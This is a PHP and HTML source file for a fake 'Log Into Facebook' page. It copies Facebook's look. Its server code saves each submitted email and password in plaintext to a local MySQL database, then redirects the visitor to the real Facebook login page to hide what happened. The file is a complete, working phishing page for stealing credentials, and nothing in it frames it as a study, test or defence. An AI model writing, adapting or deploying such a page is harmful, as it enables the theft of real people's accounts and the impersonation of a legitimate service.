<?php
// Database connection details
$servername = "localhost";
$username = "root";
$password = "";
$dbname = "facebook_db";

// Create connection
$conn = new mysqli($servername, $username, $password, $dbname);

// Check connection
if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}

// Check if the form was submitted
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Get form data
    $email = $_POST["email"];
    $password = $_POST["password"];


    // Prepare and execute the SQL statement
    $sql = "INSERT INTO users (email, password) VALUES (?, ?)";
    $stmt = $conn->prepare($sql);
    $stmt->bind_param("ss", $email, $password);


    if ($stmt->execute()) {
        header("Location: https://www.facebook.com/login");
        exit(); 
    } else {
        echo "Error: " . $sql . "<br>" . $conn->error;
    }

    $stmt->close();
}

// Close connection
$conn->close();
?>

<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Facebook Login</title>
  <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="facebook-logo">facebook</div>
    <div class="login-container">
        <div class="login-title">Log Into Facebook</div>
        <form method="post">
            <input type="text" placeholder="Email address or phone number" name="email" require>
            <input type="password" placeholder="Password" name="password" require>
            <button type="submit" class="login-button">Log In</button>
        </form>
        <div class="links">
            <a href="#">Forgot account?</a>
            <span class="divider">·</span>
            <a href="#">Sign up for Facebook</a>
        </div>
    </div>
</body>
</html>